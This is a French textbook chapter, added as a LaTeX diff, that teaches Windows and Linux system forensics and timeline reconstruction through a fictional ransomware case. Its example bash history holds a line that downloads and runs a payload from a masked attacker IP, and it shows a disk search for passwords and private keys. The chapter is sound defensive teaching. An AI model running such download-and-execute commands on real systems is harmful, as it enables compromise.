@@ -1,0 +1,683 @@
+% ============================================================================
+% Fichier  : partie4/P04_C14_forensique_systeme.tex
+% Titre    : Forensique Système Avancée
+% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
+% Version  : 1.0 -- Juin 2026
+% ============================================================================
+
+\chapter{Forensique Système Avancée}
+\label{chap:for-sys}
+
+\epigraph{%
+    « Les systèmes d'exploitation sont les témoins silencieux de nos
+    actions numériques. Savoir les interroger, c'est maîtriser l'art
+    de faire parler le silence. »%
+}{Thierry Minka}
+
+\niveauChapitre{Expert}{%
+    Maîtrise des Chapitres~6~(UE~SEC4031) à~9~(UE~SEC4031) (Partie~II)
+    indispensable. Notions de systèmes d'exploitation Windows et Linux
+    (systèmes de fichiers, registre, processus) requises.%
+}
+
+\begin{boxobjectifs}
+\begin{itemize}
+    \item Analyser les artefacts Windows post-acquisition~: registre,
+          Prefetch, ShimCache, Amcache, journal \texttt{\$MFT}.
+    \item Reconstruire une timeline d'activité système à partir de
+          sources hétérogènes (logs, métadonnées de fichiers, registre).
+    \item Analyser les artefacts Linux~: journaux \texttt{systemd},
+          historique bash, structures \texttt{ext4} et inodes.
+    \item Distinguer ce qui survit à une suppression de fichier de ce
+          qui disparaît, et comprendre pourquoi (Locard numérique).
+    \item Appliquer la distinction Examination/Analysis (NIST~SP~800-86~\cite{nist80086})
+          à l'analyse système.
+    \item Construire une timeline forensique avec Autopsy/log2timeline
+          et l'interpréter dans le respect du principe de falsification
+          (E9bis PIU).
+\end{itemize}
+\end{boxobjectifs}
+
+\bigskip
+
+% ============================================================================
+\section*{Ce chapitre dans la séquence du cours}
+% ============================================================================
+
+Le Chapitre~9~(UE~SEC4031) vous a appris à \textbf{acquérir}~: créer
+une image E01, capturer la RAM, extraire un téléphone. Ce chapitre vous
+apprend à \textbf{analyser} ce que vous avez acquis. La question change~:
+non plus ``comment obtenir des données sans les altérer'', mais
+``que disent ces données, et comment le prouver''.
+
+\separateur
+
+% ============================================================================
+\section{Le Principe de Locard Appliqué au Système}
+\label{sec:locard-systeme}
+% ============================================================================
+
+Le principe de Locard~\cite{locard1920} (Chapitre~4~(UE~SEC4031)) ``tout contact
+laisse une trace'', se traduit, dans un système d'exploitation, par
+une multiplication d'artefacts redondants. Une seule action utilisateur
+laisse souvent \textbf{cinq à dix traces indépendantes}, dans des
+emplacements différents, avec des granularités temporelles différentes.
+
+\begin{boxdef}
+\textbf{Redondance forensique}\index{redondance forensique}~: propriété
+selon laquelle une même action système produit plusieurs artefacts
+indépendants. La redondance est la meilleure amie de l'investigateur~:
+si un artefact est supprimé ou falsifié, les autres subsistent et
+révèlent l'incohérence.
+\end{boxdef}
+
+\textbf{Exemple~: exécution d'un fichier \texttt{malware.exe} sur Windows}~:
+
+\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
+    \tableauHeader{Artefact} &
+    \tableauHeader{Information capturée} &
+    \tableauHeader{Survit à la suppression du fichier~?}
+}
+Prefetch (\texttt{.pf}) & Nom, chemin, nombre d'exécutions, dernière
+    exécution, fichiers chargés &
+    \textbf{Oui}. fichier séparé dans \texttt{C:\textbackslash Windows\textbackslash Prefetch} \\
+ShimCache (AppCompatCache) & Chemin, taille, horodatage de dernière
+    modification, présence d'exécution &
+    \textbf{Oui}. clé de registre, persiste après suppression \\
+Amcache.hve & Hash SHA-1 du binaire, chemin, premier horodatage
+    d'exécution &
+    \textbf{Oui}. ruche de registre séparée \\
+\texttt{\$MFT} (NTFS) & Métadonnées du fichier~: création, modification,
+    accès, taille &
+    \textbf{Partiellement}. l'entrée MFT peut être réutilisée
+    mais le \texttt{\$LogFile} en garde trace \\
+Journal des événements
+    (Event~ID~4688) & Création de processus, utilisateur, ligne
+    de commande &
+    \textbf{Oui}. fichier \texttt{.evtx} séparé \\
+USN Journal (\texttt{\$UsnJrnl}) & Historique des modifications du
+    volume (création, suppression, renommage) &
+    \textbf{Oui}. journal continu, rotation sur volume \\
+\end{tableaucours}
+\vspace{-0.8em}
+\begin{center}{\small\itshape Tableau~14.1. Redondance forensique~:
+6~artefacts pour une seule exécution}\end{center}
+
+\begin{boxCRO}
+\textbf{Analyse CRO. Redondance et opposabilité}
+
+$\mathcal{R}$ (Fiabilité)~: la convergence de 6~artefacts indépendants
+vers la même conclusion (``\texttt{malware.exe} a été exécuté le
+13/03/2026 à 02h17'') constitue une preuve bien plus robuste qu'un
+seul artefact, même solide.
+
+$\mathcal{O}$ (Opposabilité)~: un avocat peut contester un artefact
+isolé (``ce Prefetch pourrait dater d'un test antérieur''). Il ne
+peut pas contester la convergence de 6~sources indépendantes sans
+expliquer comment elles ont \emph{toutes} été falsifiées de façon
+cohérente ce qui est techniquement très difficile.
+
+\cro{$\sim$}{$\uparrow\uparrow$ convergence multi-sources}{$\uparrow\uparrow$ incontestable en pratique}
+
+\textbf{Règle pratique~:} ne jamais conclure sur la base d'un seul
+artefact si d'autres sont accessibles. Documenter systématiquement
+la convergence (ou la divergence, qui est elle-même une information).
+\end{boxCRO}
+
+% ============================================================================
+\section{Artefacts Windows~: Registre et Exécution de Programmes}
+\label{sec:artefacts-windows}
+% ============================================================================
+
+\subsection{Les ruches de registre essentielles}
+
+Le \termecle{registre Windows}\index{registre Windows} est une base de
+données hiérarchique stockant la configuration du système et des
+applications. Cinq ruches sont systématiquement analysées en forensique~:
+
+\begin{tableaucours}{p{2.5cm}p{3.0cm}p{6.0cm}}{%
+    \tableauHeader{Ruche} &
+    \tableauHeader{Emplacement disque} &
+    \tableauHeader{Contenu forensique}
+}
+\texttt{SYSTEM} & \texttt{C:\textbackslash Windows\textbackslash System32\textbackslash config} &
+    Configuration système, services, périphériques USB connectés
+    (\texttt{USBSTOR}), fuseau horaire \\
+\texttt{SOFTWARE} & idem &
+    Applications installées, versions, ShimCache (AppCompatCache) \\
+\texttt{SAM} & idem &
+    Comptes utilisateurs locaux, hash NTLM, dernière connexion \\
+\texttt{NTUSER.DAT} & \texttt{C:\textbackslash Users\textbackslash <user>} &
+    Historique d'exécution (\texttt{RunMRU}), fichiers récents
+    (\texttt{RecentDocs}), répertoires tapés (\texttt{TypedPaths}) \\
+\texttt{Amcache.hve} & \texttt{C:\textbackslash Windows\textbackslash AppCompat\textbackslash Programs} &
+    Inventaire d'applications exécutées avec hash SHA-1 \\
+\end{tableaucours}
+\vspace{-0.8em}
+\begin{center}{\small\itshape Tableau~14.2. Ruches de registre essentielles}\end{center}
+
+\subsection{Extraction et analyse avec RegRipper}
+
+\begin{boxoutils}{RegRipper, extraction des ruches de registre}
+\begin{lstlisting}[language=bash_forensique]
+# Extraire les ruches depuis l'image montee (lecture seule)
+# Image montee sous /mnt/evidence/
+
+# Lister les programmes installes
+rip.pl -r /mnt/evidence/Windows/System32/config/SOFTWARE
+    -p installedsoftware
+
+# Historique des executions via UserAssist (NTUSER.DAT)
+rip.pl -r /mnt/evidence/Users/MBONGO/NTUSER.DAT -p userassist
+# Resultat type :
+# \Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
+#   {chemin}\enc_all.ps1  -- Run Count: 1
+#   LastExecuted: 2026-03-13 02:17:42
+
+# Peripheriques USB connectes (historique complet)
+rip.pl -r /mnt/evidence/Windows/System32/config/SYSTEM -p usbstor
+# Resultat type :
+# DeviceClass: Disk
+# FriendlyName: Kingston DataTraveler 16GB
+# Serial: 0123456789ABCDEF
+# FirstConnect: 2026-03-10 09:15:22
+# LastConnect: 2026-03-13 02:05:11
+
+# ShimCache (AppCompatCache) -- preuve d'execution
+rip.pl -r /mnt/evidence/Windows/System32/config/SYSTEM -p shimcache
+# Resultat type :
+# Path: C:\Users\admin\AppData\Local\Temp\enc_all.ps1
+# Last Modified: 2026-03-13 02:16:58
+# Executed: TRUE
+\end{lstlisting}
+\end{boxoutils}
+
+\begin{boxscenario}{Reconstitution UserAssist, cas MVOM}
+Dans l'Opération MVOM (Chapitre~3~(UE~SEC4031)), l'analyse
+UserAssist de la ruche \texttt{NTUSER.DAT} de l'administrateur
+TRANSBOIS révèle~:
+
+\begin{lstlisting}[language=bash_forensique]
+UserAssist Key: {CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
+  powershell.exe          Run Count: 1   Last: 2026-03-13 02:17:40
+  cmd.exe                 Run Count: 1   Last: 2026-03-13 02:17:42
+  AnyDesk.exe             Run Count: 3   Last: 2026-03-13 02:10:15
+\end{lstlisting}
+
+\textbf{Constatation (sans interprétation)~:} L'application
+\texttt{AnyDesk.exe} (logiciel de bureau à distance) a été exécutée
+3~fois, la dernière à 02h10. \texttt{cmd.exe} a été exécuté à 02h17.
+L'ordre chronologique place l'établissement d'un accès distant
+\emph{avant} l'exécution des commandes suspectes.\\[0.3ex]
+Cette constatation, croisée avec \texttt{windows.netscan} (Volatility,
+Ch.~9~(UE~SEC4031)) qui montre une connexion \texttt{ESTABLISHED} vers
+le port~4444 à 02h17, \textbf{converge} vers une chronologie cohérente~:
+accès distant établi~$\to$ ouverture d'un shell~$\to$ déploiement
+du ransomware.
+\end{boxscenario}
+
+\subsection{Le Prefetch~: preuve d'exécution même sans logs}
+
+Le \termecle{Prefetch}\index{Prefetch} est un mécanisme d'optimisation
+Windows qui enregistre, pour chaque exécutable lancé, un fichier
+\texttt{.pf} dans \texttt{C:\textbackslash Windows\textbackslash Prefetch}.
+Ces fichiers survivent souvent à la suppression de l'exécutable lui-même.
+
+\begin{boxoutils}{Analyse Prefetch avec PECmd}
+\begin{lstlisting}[language=bash_forensique]
+# PECmd (Eric Zimmerman tools) -- analyse complete du repertoire Prefetch
+PECmd.exe -d /mnt/evidence/Windows/Prefetch --csv ./output/
+
+# Resultat (extrait CSV) :
+# SourceFilename       : ENC_ALL.PS1-3F8A2B91.pf
+# ExecutableName       : enc_all.ps1
+# RunCount             : 1
+# LastRun              : 2026-03-13 02:17:44
+# Volume0Created       : 2024-01-15 10:00:00
+# FilesAccessed        : C:\Windows\System32\WindowsPowerShell\...
+#                        C:\Users\admin\AppData\Local\Temp\enc_all.ps1
+#                        C:\Users\Public\Documents\encrypted_files_list.txt
+\end{lstlisting}
+\textbf{Valeur forensique~:} même si \texttt{enc\_all.ps1} a été supprimé
+par l'attaquant après exécution, le fichier Prefetch
+\texttt{ENC\_ALL.PS1-3F8A2B91.pf} subsiste et révèle~: le nom exact du
+script, son horodatage d'exécution (02h17:44, cohérent avec UserAssist
+et Volatility), et la liste des fichiers accédés y compris
+\texttt{encrypted\_files\_list.txt}, preuve directe de l'activité ransomware.
+\end{boxoutils}
+
+% ============================================================================
+\section{Le Système de Fichiers NTFS~: \texttt{\$MFT} et \texttt{\$UsnJrnl}}
+\label{sec:ntfs}
+% ============================================================================
+
+\subsection{La Master File Table}
+
+La \termecle{\$MFT}\index{\$MFT} (\textit{Master File Table}) est la
+structure centrale de NTFS~: chaque fichier et répertoire y possède une
+entrée de 1024~octets contenant ses métadonnées. Quatre horodatages
+(\textbf{MACE}) sont enregistrés pour chaque fichier~:
+
+\begin{tableaucours}{p{2.0cm}p{3.0cm}p{6.5cm}}{%
+    \tableauHeader{Timestamp} &
+    \tableauHeader{Signification} &
+    \tableauHeader{Piège forensique fréquent}
+}
+\textbf{M}. Modified & Dernière modification du contenu &
+    Modifié par toute écriture, même mineure~; ne reflète pas
+    la création \\
+\textbf{A}. Accessed & Dernier accès en lecture &
+    \textbf{Souvent désactivé} depuis Windows~Vista
+    (\texttt{NtfsDisableLastAccessUpdate=1})~; ne pas s'y fier
+    sans vérification \\
+\textbf{C}. Changed (MFT) & Dernière modification de
+    l'\emph{entrée MFT} elle-même (métadonnées, permissions) &
+    Différent de Modified~! Un renommage modifie C sans modifier M \\
+\textbf{E}. Entry created/Birth & Création de l'entrée MFT &
+    Peut différer de la date de création réelle du fichier
+    si copié depuis un autre volume \\
+\end{tableaucours}
+\vspace{-0.8em}
+\begin{center}{\small\itshape Tableau~14.3. Les quatre horodatages MACE de NTFS}\end{center}
+
+\begin{boxalert}
+\textbf{``Timestomping''~: la manipulation des horodatages}
+
+Des outils comme \texttt{timestomp} permettent à un attaquant de
+modifier artificiellement les 4~horodatages MACE d'un fichier pour
+le faire ``apparaître'' plus ancien et échapper à la timeline.
+
+\textbf{Détection~:} le \texttt{\$UsnJrnl} (section suivante) et le
+\texttt{\$LogFile} (journal de transactions NTFS) enregistrent les
+\emph{changements} d'horodatages indépendamment des valeurs MACE
+elles-mêmes. Une entrée \texttt{\$MFT} affichant une date de création
+``2020'' alors que le \texttt{\$UsnJrnl} montre une création le
+``13/03/2026'' révèle un timestomping. \textbf{Toujours croiser
+\$MFT et \$UsnJrnl pour les fichiers suspects.}
+\end{boxalert}
+
+\subsection{Le journal USN~: l'historique immuable des changements}
+
+Le \termecle{\$UsnJrnl}\index{\$UsnJrnl} (\textit{Update Sequence Number
+Journal}) enregistre chronologiquement chaque opération sur le système
+de fichiers~: création, suppression, renommage, modification.
+Contrairement à la \texttt{\$MFT} qui ne montre que l'\emph{état actuel},
+le \texttt{\$UsnJrnl} montre l'\emph{historique}.
+
+\begin{boxoutils}{Extraction du \$UsnJrnl avec MFTECmd}
+\begin{lstlisting}[language=bash_forensique]
+# Extraction et parsing du journal USN
+MFTECmd.exe -f /mnt/evidence/\$Extend/\$UsnJrnl:\$J --csv ./output/
+
+# Resultat (extrait, chronologique) :
+# Timestamp            Filename              Reason
+# 2026-03-13 02:16:50  enc_all.ps1           FileCreate
+# 2026-03-13 02:17:44  enc_all.ps1           DataExtend|Close
+# 2026-03-13 02:18:30  enc_all.ps1           FileDelete
+# 2026-03-13 02:18:31  encrypted_files_list.txt  FileCreate
+# 2026-03-13 02:18:31  *.docx (x847)         DataOverwrite (chiffrement)
+\end{lstlisting}
+\textbf{Constatation~:} le \texttt{\$UsnJrnl} révèle la séquence
+exacte~: création du script (02h16:50)~$\to$ exécution (02h17:44, cohérent
+avec Prefetch/UserAssist)~$\to$ suppression du script (02h18:30, tentative
+d'anti-forensique)~$\to$ chiffrement de masse (02h18:31, 847~fichiers).
+\textbf{La suppression du script à 02h18:30 n'a effacé ni le Prefetch,
+ni UserAssist, ni le \$UsnJrnl lui-même.}
+\end{boxoutils}
+
+% ============================================================================
+\section{Artefacts Linux~: journald, bash et ext4}
+\label{sec:artefacts-linux}
+% ============================================================================
+
+\subsection{Le journal systemd}
+
+Sur les systèmes Linux modernes (Ubuntu~20.04+, Debian~11+, RHEL~8+),
+\termecle{journald}\index{journald} centralise les logs système dans
+un format binaire indexé.
+
+\begin{boxoutils}{Analyse forensique de journald}
+\begin{lstlisting}[language=bash_forensique]
+# Analyser les journaux d'une image montee (hors-ligne)
+journalctl --root=/mnt/evidence --since "2026-03-13 02:00:00" \
+    --until "2026-03-13 03:00:00"
+
+# Filtrer par service (ex : SSH)
+journalctl --root=/mnt/evidence -u ssh.service
+
+# Connexions SSH reussies / echouees
+journalctl --root=/mnt/evidence | grep -i "sshd.*Accepted\|sshd.*Failed"
+# Resultat type :
+# Mar 13 02:14:02 srv sshd[4821]: Failed password for root from
+#     185.220.XX.XX port 51234 ssh2
+# Mar 13 02:14:09 srv sshd[4821]: Accepted password for root from
+#     185.220.XX.XX port 51234 ssh2
+# -> 7 tentatives echouees puis succes : brute-force reussi
+
+# Commandes sudo executees
+journalctl --root=/mnt/evidence | grep "sudo:.*COMMAND"
+\end{lstlisting}
+\end{boxoutils}
+
+\subsection{Historique bash et fichiers de configuration shell}
+
+\begin{boxoutils}{Artefacts shell -- bash\_history et environnement}
+\begin{lstlisting}[language=bash_forensique]
+# Historique des commandes (attention : tronque a HISTSIZE)
+cat /mnt/evidence/root/.bash_history
+cat /mnt/evidence/home/*/.bash_history
+
+# Timestamps si HISTTIMEFORMAT etait active :
+# #1678672664
+# wget http://185.220.XX.XX/payload.sh
+# #1678672680
+# chmod +x payload.sh && ./payload.sh
+
+# Fichiers de configuration modifies recemment (persistance)
+find /mnt/evidence/etc -name "*.service" -newer \
+    /mnt/evidence/etc/hostname
+
+# Crontabs -- mecanisme de persistance frequent
+cat /mnt/evidence/etc/crontab
+cat /mnt/evidence/var/spool/cron/crontabs/*
+ls -la /mnt/evidence/etc/cron.d/
+
+# Cles SSH autorisees (backdoor frequente)
+cat /mnt/evidence/root/.ssh/authorized_keys
+cat /mnt/evidence/home/*/.ssh/authorized_keys
+\end{lstlisting}
+\end{boxoutils}
+
+\begin{boiteRemarque}{bash\_history~: une preuve fragile}
+Le fichier \texttt{.bash\_history} n'est écrit sur disque qu'à la
+fermeture propre du shell (\texttt{exit}, ou périodiquement). Un
+attaquant qui tue brutalement sa session (\texttt{kill~-9}) ou
+définit \texttt{HISTSIZE=0} laisse un historique vide ou incomplet.
+\textbf{Ne jamais conclure ``aucune commande exécutée'' sur la seule
+absence d'historique~: croiser avec \texttt{journald},
+\texttt{auditd} (si actif), et l'analyse mémoire (Volatility~3,
+\texttt{linux.bash} récupère l'historique depuis la mémoire
+même non écrit sur disque).}
+\end{boiteRemarque}
+
+\subsection{Structures ext4~: inodes et récupération}
+
+Le système de fichiers \termecle{ext4}\index{ext4} organise chaque
+fichier autour d'un \textit{inode} contenant ses métadonnées
+(taille, permissions, horodatages, pointeurs vers les blocs de données).
+La suppression d'un fichier sous ext4 libère l'inode et marque les blocs
+comme disponibles, \textbf{sans effacer immédiatement le contenu}.
+
+\begin{boxoutils}{Récupération de fichiers supprimés ext4 avec extundelete}
+\begin{lstlisting}[language=bash_forensique]
+# Lister les inodes recemment supprimes
+extundelete /mnt/evidence/dev/sdb1 --inode 2
+
+# Recuperer tous les fichiers supprimes recuperables
+extundelete /mnt/evidence/dev/sdb1 --restore-all \
+    -o /output/recovered/
+
+# Alternative : debugfs pour inspection manuelle d'un inode
+debugfs -R "stat <12345>" /mnt/evidence/dev/sdb1
+# Affiche : Inode, Mode, taille, Links, horodatages, blocs
+
+# Recherche de chaines dans l'espace libre (complement carving Ch. 9)
+dd if=/mnt/evidence/dev/sdb1 bs=4096 skip=0 | \
+    strings -n 8 | grep -i "password\|api_key\|BEGIN PRIVATE KEY"
+\end{lstlisting}
+\end{boxoutils}
+
+% ============================================================================
+\section{Reconstruction de Timeline Forensique}
+\label{sec:timeline}
+% ============================================================================
+
+\subsection{Pourquoi une timeline unifiée}
+
+Chaque source d'artefacts (registre, \texttt{\$MFT}, \texttt{\$UsnJrnl},
+journald, logs applicatifs) produit ses propres horodatages dans des
+formats différents. La \termecle{timeline forensique}\index{timeline
+forensique} unifie ces sources en une chronologie unique, permettant
+de \textbf{voir la séquence complète des événements} et d'identifier
+les corrélations qu'aucune source isolée ne révèle.
+
+\subsection{log2timeline / plaso}
+
+\begin{boxoutils}{Construction d'une timeline avec log2timeline (plaso)}
+\begin{lstlisting}[language=bash_forensique]
+# Generer le fichier plaso (extraction brute, multi-sources)
+log2timeline.py /output/timeline.plaso /mnt/evidence/
+
+# Filtrer et exporter en CSV pour la periode d'interet
+psort.py -o l2tcsv -w /output/timeline.csv /output/timeline.plaso \
+    "date > '2026-03-13 02:00:00' AND date < '2026-03-13 03:00:00'"
+
+# Exemple de timeline consolidee (extrait, toutes sources) :
+# 02:14:02  journald     SSH Failed password from 185.220.XX.XX
+# 02:14:09  journald     SSH Accepted password (root)
+# 02:16:50  $UsnJrnl     FileCreate enc_all.ps1
+# 02:17:40  UserAssist   powershell.exe executed
+# 02:17:42  UserAssist   cmd.exe executed
+# 02:17:44  Prefetch     enc_all.ps1 executed (RunCount=1)
+# 02:17:44  $UsnJrnl     enc_all.ps1 DataExtend|Close
+# 02:18:30  $UsnJrnl     enc_all.ps1 FileDelete
+# 02:18:31  $UsnJrnl     encrypted_files_list.txt FileCreate
+# 02:18:31  $UsnJrnl     *.docx (x847) DataOverwrite
+\end{lstlisting}
+\end{boxoutils}
+
+\subsection{Lecture d'une timeline~: constatation vs interprétation}
+
+\begin{boxscenario}{Timeline MVOM -- rédaction du rapport}
+À partir de la timeline consolidée ci-dessus, voici comment rédiger
+les sections \textbf{Constatations} et \textbf{Analyse} (NIST~SP~800-86,
+Ch.~7~(UE~SEC4031))~:
+
+\textbf{Constatations (faits vérifiables, non ambigus)~:}
+\begin{quote}
+``Le journal \texttt{journald} enregistre 7~tentatives de connexion
+SSH échouées depuis l'IP \texttt{185.220.XX.XX} entre 02h13:45 et
+02h14:08, suivies d'une connexion réussie au compte \texttt{root}
+à 02h14:09. Le \texttt{\$UsnJrnl} enregistre la création du fichier
+\texttt{enc\_all.ps1} à 02h16:50. UserAssist et Prefetch enregistrent
+l'exécution de \texttt{powershell.exe}, \texttt{cmd.exe} et
+\texttt{enc\_all.ps1} entre 02h17:40 et 02h17:44. Le \texttt{\$UsnJrnl}
+enregistre la suppression de \texttt{enc\_all.ps1} à 02h18:30, suivie
+à 02h18:31 de la création de \texttt{encrypted\_files\_list.txt} et
+de la modification de 847~fichiers \texttt{.docx}.''
+\end{quote}
+
+\textbf{Analyse (interprétation, avec niveau de confiance)~:}
+\begin{quote}
+``La séquence temporelle ci-dessus est cohérente, \emph{avec un niveau
+de confiance élevé}, avec le scénario suivant~: un accès SSH non
+autorisé au compte \texttt{root} a été obtenu par force brute
+(02h14)~; environ 2~minutes et 40~secondes plus tard, un script
+ransomware a été déposé et exécuté (02h16--02h18)~; ce script a
+chiffré 847~fichiers avant de tenter de s'auto-supprimer
+(02h18:30), une technique d'anti-forensique courante qui a
+échoué à effacer les traces dans le \texttt{\$UsnJrnl}, le
+Prefetch et UserAssist.''
+\end{quote}
+\end{boxscenario}
+
+% ============================================================================
+\section{Synthèse~: Méthodologie d'Analyse Système}
+\label{sec:synthese-for-sys}
+% ============================================================================
+
+\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
+    \tableauHeader{Question} &
+    \tableauHeader{Sources Windows} &
+    \tableauHeader{Sources Linux}
+}
+Quel programme a été exécuté, quand~? &
+    Prefetch, UserAssist, ShimCache, Amcache &
+    \texttt{bash\_history}, \texttt{auditd},
+    \texttt{journald} (systemd-coredump) \\
+Quel fichier a été créé/modifié/supprimé, quand~? &
+    \texttt{\$UsnJrnl}, \texttt{\$MFT} (MACE) &
+    \texttt{debugfs}, \texttt{extundelete},
+    horodatages inode \\
+Un périphérique externe a-t-il été connecté~? &
+    \texttt{USBSTOR} (registre SYSTEM), Event~ID~2003/2100 &
+    \texttt{journald} (kernel~: \texttt{usb~new device}),
+    \texttt{/var/log/syslog} \\
+Une connexion réseau a-t-elle été établie~? &
+    Volatility \texttt{netscan} (Ch.~9~(UE~SEC4031)), pare-feu &
+    \texttt{journald} (sshd, NetworkManager), \texttt{auditd} \\
+Les horodatages ont-ils été manipulés~? &
+    Croiser \texttt{\$MFT} (MACE) et \texttt{\$UsnJrnl} &
+    Croiser \texttt{stat} inode et \texttt{journald} \\
+\end{tableaucours}
+\vspace{-0.8em}
+\begin{center}{\small\itshape Tableau~14.4. Méthodologie d'analyse système~:
+question $\to$ sources}\end{center}
+
+\separateur
+
+% --- Encadré lab NDAP SUKULU ---
+\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-01}
+Le laboratoire reconstitue une intrusion sur deux systèmes à partir
+d'exports figés. Il suppose les notions suivantes.
+\begin{itemize}
+    \item \textbf{Journal d'authentification Linux} (journald ou
+          \texttt{auth.log})~: chaque échec SSH laisse une ligne
+          \texttt{Failed password for <compte>}, la réussite une ligne
+          \texttt{Accepted password}~; le nombre d'échecs qui précèdent la
+          réussite caractérise une attaque par force brute.
+    \item \textbf{Persistance par création de compte}~: un attaquant crée
+          souvent un compte (\texttt{useradd}, \texttt{adduser}) pour revenir~;
+          la création apparaît dans le journal et, souvent, dans
+          l'historique du shell.
+    \item \textbf{\texttt{.bash\_history}}~: il donne les commandes et leur
+          ordre, mais \emph{pas leur heure} (sauf si \texttt{HISTTIMEFORMAT}
+          était défini)~; l'heure se cherche dans un autre artefact.
+    \item \textbf{UserAssist et Prefetch}~: ils prouvent l'exécution d'un
+          programme~; UserAssist donne un compteur et la date de dernière
+          exécution (\texttt{last\_run})~: trier sur ce champ ordonne les
+          programmes lancés.
+    \item \textbf{\$UsnJrnl}~: il garde, pour chaque fichier, les raisons
+          de modification (\texttt{FileCreate}, \texttt{DataExtend},
+          \texttt{FileDelete})~; la création d'un fichier supprimé y reste
+          visible avec son heure.
+    \item \textbf{Comptage dans une fenêtre}~: pour mesurer l'impact, on
+          compte les fichiers modifiés \emph{après} l'événement qui ouvre
+          l'attaque, en écartant l'activité normale qui précède.
+\end{itemize}
+\end{boiteRemarque}
+
+\begin{boxresume}
+\textbf{Ce qu'il faut retenir de ce chapitre~:}
+\begin{itemize}
+    \item \textbf{Redondance forensique}~: une action système laisse
+          de multiples traces indépendantes. Toujours chercher la
+          convergence entre plusieurs sources avant de conclure.
+
+    \item \textbf{Windows~: cinq artefacts à toujours vérifier}~:
+          Prefetch (preuve d'exécution), UserAssist (historique GUI),
+          ShimCache/Amcache (inventaire d'exécution avec hash),
+          \texttt{\$UsnJrnl} (historique des changements de fichiers).
+
+    \item \textbf{MACE et timestomping}~: les 4~horodatages NTFS
+          (Modified, Accessed, Changed, Entry-created) peuvent être
+          manipulés. Le \texttt{\$UsnJrnl} et le \texttt{\$LogFile}
+          révèlent les manipulations car ils enregistrent
+          l'\emph{historique}, pas seulement l'\emph{état}.
+
+    \item \textbf{Linux~: \texttt{journald} + \texttt{bash\_history}
+          + crontabs + \texttt{authorized\_keys}}~: les quatre premiers
+          endroits à vérifier. \texttt{bash\_history} est fragile~:
+          croiser avec Volatility \texttt{linux.bash} pour l'historique
+          non écrit sur disque.
+
+    \item \textbf{ext4}~: la suppression libère l'inode sans effacer
+          immédiatement les données~; \texttt{extundelete} et
+          \texttt{debugfs} permettent la récupération.
+
+    \item \textbf{Timeline unifiée (log2timeline/plaso)}~: consolide
+          toutes les sources en une chronologie. La rédaction du
+          rapport sépare strictement \textbf{constatations}
+          (faits horodatés, vérifiables) et \textbf{analyse}
+          (interprétation, avec niveau de confiance explicite
+          NIST~SP~800-86).
+\end{itemize}
+\end{boxresume}
+
+\bigskip
+
+\begin{boxexo}[title={\ding{45}\quad Exercice~14.1. Identification d'artefacts \niveaubase}]
+Pour chacune des questions suivantes, identifiez l'artefact Windows
+ou Linux le plus pertinent, et la commande/outil pour l'extraire~:
+\begin{enumerate}[(a)]
+    \item Un suspect affirme n'avoir jamais exécuté \texttt{TrueCrypt}
+          sur son PC Windows~10. Comment vérifier~?
+    \item Une clé USB a-t-elle été branchée sur ce PC Windows dans les
+          30~derniers jours, et si oui, laquelle (numéro de série)~?
+    \item Sur un serveur Linux, un fichier \texttt{/etc/shadow} a été
+          modifié il y a 2~jours. Comment savoir qui l'a modifié et quand,
+          précisément~?
+    \item Un fichier \texttt{rapport\_confidentiel.docx} a été supprimé
+          d'un disque ext4 il y a 1~heure. Quelles sont les chances de
+          récupération et quel outil utiliser~?
+\end{enumerate}
+\end{boxexo}
+
+\begin{boxexo}[title={\ding{45}\quad Exercice~14.2. Détection de timestomping \niveaumoyen}]
+L'analyse \texttt{\$MFT} d'un fichier \texttt{rootkit.dll} montre~:
+\begin{lstlisting}[language=bash_forensique]
+Created (E):   2019-08-12 14:30:00
+Modified (M):  2019-08-12 14:30:00
+Accessed (A):  2019-08-12 14:30:00
+Changed (C):   2019-08-12 14:30:00
+\end{lstlisting}
+L'analyse \texttt{\$UsnJrnl} pour le même fichier montre~:
+\begin{lstlisting}[language=bash_forensique]
+2026-03-13 02:19:15  rootkit.dll  FileCreate
+2026-03-13 02:19:16  rootkit.dll  DataExtend|Close
+\end{lstlisting}
+\begin{enumerate}[(a)]
+    \item Que révèle cette divergence~?
+    \item Rédigez la constatation (sans interprétation) et l'analyse
+          (avec interprétation et niveau de confiance) correspondantes,
+          en respectant la distinction NIST~SP~800-86.
+    \item Quels autres artefacts (Prefetch, UserAssist, ShimCache)
+          permettraient de confirmer l'horodatage réel d'exécution~?
+\end{enumerate}
+\end{boxexo}
+
+\begin{boxexo}[title={\ding{45}\quad Exercice~14.3. Timeline complète \niveauexpert}]
+Vous disposez d'une image E01 d'un serveur Windows~Server~2022
+(Opération MVOM) et d'un dump RAM associé. Le service IT signale
+que le ransomware a chiffré les fichiers entre 02h15 et 02h20
+le 13~mars~2026, mais ne sait pas comment l'attaquant a obtenu
+l'accès initial.
+
+\begin{enumerate}[(a)]
+    \item Construisez le plan d'investigation~: dans quel ordre
+          analyser quelles sources (registre, \texttt{\$MFT},
+          \texttt{\$UsnJrnl}, journal des événements, RAM)~? Justifiez
+          l'ordre.
+    \item Pour chaque source analysée, quelle question spécifique
+          cherchez-vous à répondre~?
+    \item Construisez (sur la base des éléments fournis dans ce
+          chapitre et au Chapitre~9~(UE~SEC4031)) la timeline complète
+          de l'incident, de l'accès initial au chiffrement.
+    \item Rédigez les sections Constatations et Analyse de votre
+          rapport~: au moins 5~constatations horodatées et une
+          analyse globale avec niveau de confiance explicite.
+\end{enumerate}
+\end{boxexo}
+
+\bigskip
+
+\begin{boxinfo}
+\textbf{Transition.} Le Chapitre~\ref{chap:for-res} (Forensique Réseau
+Opérationnelle) complète ce chapitre en se concentrant sur les artefacts
+\emph{réseau}~: capture et analyse approfondie de trafic, détection
+d'exfiltration de données, analyse de protocoles chiffrés. Le
+Chapitre~\ref{chap:anti-for} (Anti-Forensique et Contre-Mesures)
+traite ensuite des techniques que les attaquants utilisent pour
+échapper exactement aux analyses présentées dans ce chapitre et
+comment les détecter malgré tout.
+\end{boxinfo}
